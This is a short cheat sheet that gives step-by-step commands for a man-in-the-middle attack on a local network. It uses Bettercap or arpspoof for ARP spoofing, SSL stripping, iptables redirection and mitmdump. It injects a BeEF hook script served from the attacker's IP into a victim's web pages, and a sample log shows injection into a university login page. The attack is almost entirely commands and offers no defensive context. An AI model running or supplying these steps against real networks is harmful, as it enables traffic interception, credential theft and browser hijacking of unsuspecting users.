
# Bettercap Cheat Sheet

## First Approach

1. Start beef-xss:
   ```bash
   sudo beef-xss
   ```

2. Run Bettercap with the specified network interface:
   ```bash
   bettercap -iface eth0
   ```

3. Enable network probing:
   ```bash
   net.probe on
   ```

4. Choose your target and disable network probing:
   ```bash
   net.probe off
   ```

5. Set ARP spoof targets and other configurations:
   ```bash
   set arp.spoof.targets TargetIP,GateawayIP,GateawayIP,TargetIp
   set http.proxy.sslstrip true
   set https.proxy.sslstrip true
   set http.proxy.injectjs http://MyIP:3000/hook.js
   set https.proxy.injectjs http://MyIP:3000/hook.js
   ```

6. Enable ARP spoofing, HTTP/HTTPS proxy, and network sniffing:
   ```bash
   arp.spoof on
   http.proxy on
   https.proxy on
   net.sniff on
   ```

7. Monitor the logs to see JavaScript injection:
   ```
   [sys.log] [inf] https.proxy > injecting javascript (87 bytes) into moodle.cs.ucy.ac.cy/login/index.php (27019 bytes) for TargetIP
   ```

> Note: If the device is not hooked on the beef-xss dashboard, proceed with the second approach.

## Second Approach

1. Start beef-xss:
   ```bash
   sudo beef-xss
   ```

2. Enable IP forwarding:
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```

3. Set up iptables rules:
   ```bash
   sudo iptables -A FORWARD --in-interface [iface] -j ACCEPT
   sudo iptables -t nat -A PREROUTING -i [iface] -p tcp --dport 80 -j REDIRECT --to-port 8080
   ```

4. Run ARP spoofing:
   ```bash
   arpspoof -i [iface] -t [victim-ip] [gateway-ip]
   arpspoof -i [iface] -t [gateway-ip] [victim-ip]
   ```

5. Start mitmdump with a custom script:
   ```bash
   mitmdump --mode transparent -s js_injector.py
   ```

## js_injector.py

Use the `js_injector.py` file in the git repository.
